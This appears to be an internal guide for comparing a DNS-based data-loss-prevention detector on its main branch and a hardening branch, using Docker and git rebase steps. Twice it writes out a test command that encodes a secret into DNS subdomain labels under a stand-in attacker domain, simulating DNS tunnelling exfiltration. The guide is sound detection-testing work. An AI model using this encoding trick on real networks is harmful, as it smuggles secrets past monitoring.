# Evaluating and A/B Testing Hardening Branches

This guide outlines the standard workflow for evaluating security hardening branches against the baseline (`main`).

## Prerequisites

- Clean working tree (`git status` shows no uncommitted changes).
- Docker running (`docker compose up -d`).

## 1. Baseline Verification (`main`)

Verify the initial behavior (evasion or false negative) on the baseline branch:

```bash
# 1. Switch to main and pull the latest changes
git switch main
git pull origin main

# 2. Reload the detector service
docker compose restart dlp-covert-detector
# If code is not mounted via volumes:
# docker compose up -d --build dlp-covert-detector

# 3. Inject the test query from the victim container (example)
TARGET="172.21.0.10"
APEX="attacker.example"
SECRET="k9x2m7q8w4p1z3v5"
PAD="aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"

docker compose exec victim dig "@${TARGET}" "${SECRET}.${PAD}.${PAD}.${APEX}" +short

# 4. Check detector logs for false negatives (example)
docker compose logs --tail=20 dlp-covert-detector
```

## 2. Branch Synchronization and Rebase

Rebase the evaluation branch on top of updated `main` to avoid unnecessary merge commits:

```bash
# 1. Switch to the evaluation branch
git switch evaluation/dns-entropy-hardening

# 2. Rebase patch commits on top of updated main
git rebase main

# 3. Update the remote reference safely (example)
git push --force-with-lease origin evaluation/dns-entropy-hardening
```

> **History Divergence:**
> To avoid duplicate merge commits, please never run `git pull` on a rebased branch. Instead : always update the remote using `git push --force-with-lease`.

## 3. Patched Validation (Hardened Branch)

Validate that the detector triggers properly with the patch applied:

```bash
# 1. Reload the container with patched code
docker compose restart dlp-covert-detector
# Or rebuild if necessary:
# docker compose up -d --build dlp-covert-detector

# 2. Re-run the identical payload (example)
TARGET="172.21.0.10"
APEX="attacker.example"
SECRET="k9x2m7q8w4p1z3v5"
PAD="aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"

docker compose exec victim dig "@${TARGET}" "${SECRET}.${PAD}.${PAD}.${APEX}" +short

# 3. Verify detection alert in logs (example)
docker compose logs --tail=20 dlp-covert-detector
```

## 4. Resetting to Baseline

Switch back to `main` once evaluation is complete:

```bash
git switch main
docker compose restart dlp-covert-detector # Or the relevant container
```